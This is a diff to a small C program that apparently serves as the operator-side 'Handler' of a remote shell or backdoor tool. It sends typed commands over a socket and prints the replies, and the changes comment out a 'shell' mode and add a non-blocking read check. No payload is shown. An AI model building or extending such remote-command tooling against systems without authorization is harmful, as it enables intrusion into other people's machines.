@@ -10,6 +10,7 @@
 #include <netinet/in.h>
 #include <sys/types.h>
 #include <sys/socket.h>
+#include <sys/ioctl.h>
 
 //MY INCLUDES
 #include "help.h"
@@ -109,8 +110,8 @@ int main(int argc, char *argv[])
 		}
 
 		//if we arent currently dropped into a shell, show this prompt
-		if(!shell)
-			printf("Handler> ");
+//		if(!shell)
+		printf("Handler> ");
 
 		fgets(command, sizeof(command), stdin); //input the command
 
@@ -126,7 +127,17 @@ int main(int argc, char *argv[])
 
 		write(sock, command, strlen(command));
 
-		if(!strcmp(command, "shell\n") || !strcmp(command, "shell2\n"))
+		int count = 0; //this will hold buffer ammound
+		ioctl(sock, FIONREAD, &count); //this will find amount of data on socket
+
+		if(count) //read from the buffer if there is anything to read
+		{
+			read(sock, buff, count);
+			printf("%s",buff);
+		}
+
+
+/*		if(!strcmp(command, "shell\n") || !strcmp(command, "shell2\n"))
 		{
 			shell++;
 			continue;
@@ -158,7 +169,7 @@ int main(int argc, char *argv[])
 		//read from the output that the client gives us and then print to screen
 		read(sock, buff, sizeof(buff));
 		puts(buff);
-
+*/
 
 	}
 
